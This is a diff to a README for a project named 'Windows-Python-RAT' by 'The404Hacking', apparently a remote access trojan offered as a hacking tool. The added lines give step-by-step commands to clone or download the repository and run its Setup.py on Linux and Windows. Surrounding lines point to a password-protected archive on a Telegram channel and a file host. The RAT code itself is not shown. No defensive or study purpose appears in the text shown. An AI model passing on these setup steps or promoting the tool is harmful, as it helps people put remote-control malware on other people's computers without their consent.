@@ -87,6 +87,22 @@ Download from [Telegram Channel](https://t.me/The404Hacking/3317) or [PicoFile](
 Password `autopy-[@The404Hacking].rar` File is: **@The404Hacking**
 
 -------------------------------
+# Clone and Run Setup
++ Linux:
+```
+git clone ‎https://github.com/The404Hacking/Windows-Python-RAT.git
+cd Windows-Python-RAT
+python Setup.py
+```
++ Windows
+```
+Download from ‎https://github.com/The404Hacking/Windows-Python-RAT/archive/master.zip
+Windows-Python-RAT.zip
+Extract files.
+cd Windows-Python-RAT
+python Setup.py
+```
+-------------------------------
 Logo:
 
 ![Windows-Python-RAT Logo](Windows-Python-RAT.jpg?raw=true "Windows-Python-RAT Logo")
